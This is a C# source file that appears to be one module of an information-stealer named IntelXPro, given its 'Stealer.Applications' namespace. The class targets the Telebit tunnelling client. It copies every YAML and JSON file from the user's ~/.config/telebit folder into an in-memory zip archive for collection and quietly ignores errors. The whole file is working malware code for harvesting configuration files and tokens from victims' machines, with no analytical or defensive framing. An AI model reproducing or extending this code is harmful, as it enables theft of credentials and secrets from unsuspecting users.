using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Telebit : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string userProfilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".config", "telebit");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Telebit";

            bool foundData = false;

            if (Directory.Exists(userProfilePath))
            {
                try
                {
                    string[] ymlFiles = Directory.GetFiles(userProfilePath, "*.yml", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in ymlFiles)
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\Telebit\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }

                    string[] jsonFiles = Directory.GetFiles(userProfilePath, "*.json", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in jsonFiles)
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\Telebit\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
                catch
                {
                }
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
